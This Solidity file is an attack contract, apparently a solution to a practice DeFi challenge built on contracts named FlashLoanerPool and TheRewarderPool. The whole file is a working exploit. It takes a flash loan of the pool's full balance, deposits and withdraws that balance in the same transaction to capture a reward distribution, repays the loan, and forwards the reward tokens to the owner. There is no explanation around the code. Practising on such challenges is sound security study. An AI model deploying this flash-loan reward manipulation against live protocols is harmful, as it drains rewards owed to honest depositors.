// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256 amount) external;
}

contract RewardAttacker is IFlashLoanReceiver {
    address private immutable owner;
    FlashLoanerPool private loanPool;
    TheRewarderPool private rewarderPool;
    IERC20 private liquidityToken;
    constructor(address loanPoolAddress, address rewarderPoolAddress) {
        owner = msg.sender;
        loanPool = FlashLoanerPool(loanPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        liquidityToken = rewarderPool.liquidityToken();
    }

    function receiveFlashLoan(uint256 amount) override external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(loanPool), amount);
    }

    function attack() external {
        require(msg.sender == owner, "Must be owner");
        uint256 loanPoolBalance = liquidityToken.balanceOf(address(loanPool));
        loanPool.flashLoan(loanPoolBalance);
        IERC20 rewardToken = IERC20(rewarderPool.rewardToken());
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, rewardBalance);
    }
}